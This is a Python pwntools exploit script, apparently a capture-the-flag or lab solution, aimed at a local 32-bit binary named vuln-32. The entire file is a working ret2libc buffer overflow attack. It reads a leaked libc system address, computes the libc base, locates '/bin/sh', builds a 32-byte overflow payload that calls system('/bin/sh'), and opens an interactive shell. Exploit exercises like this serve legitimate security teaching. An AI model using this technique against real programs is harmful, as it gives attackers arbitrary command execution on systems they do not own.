from pwn import *

exe='./vuln-32'
elf=context.binary=ELF(exe)

libc=elf.libc

p=process()

p.recvuntil(b':')

system_address=int(p.recvline(),16)

info(f"The system address is: {hex(system_address)}")

libc.address=system_address-libc.sym["system"]

binsh=next(libc.search(b"/bin/sh\x00"))

info(f"The address of string /bin/sh : {hex(binsh)}")
offset=32

payload=flat(
    b"A"*offset,
    libc.sym["system"],
    0x0,
    binsh
)

p.sendline(payload)

p.interactive()